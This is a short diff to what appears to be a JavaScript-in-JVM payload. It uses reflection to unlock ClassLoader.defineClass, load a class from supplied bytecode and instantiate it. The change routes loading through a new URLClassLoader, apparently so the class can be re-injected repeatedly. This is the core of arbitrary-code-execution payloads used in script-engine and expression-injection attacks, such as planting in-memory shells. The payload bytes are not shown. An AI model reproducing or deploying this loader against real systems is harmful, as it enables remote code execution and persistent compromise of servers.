@@ -18,5 +18,5 @@ java.lang.reflect.Array.set(pTypes, 2, clsInt);
 java.lang.reflect.Array.set(pTypes, 3, clsInt);
 var defineClass = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", pTypes);
 defineClass.setAccessible(true);
-var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(), className, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));
+var clazz = defineClass.invoke(new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0),java.lang.Thread.currentThread().getContextClassLoader()), className, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));
 clazz.newInstance();
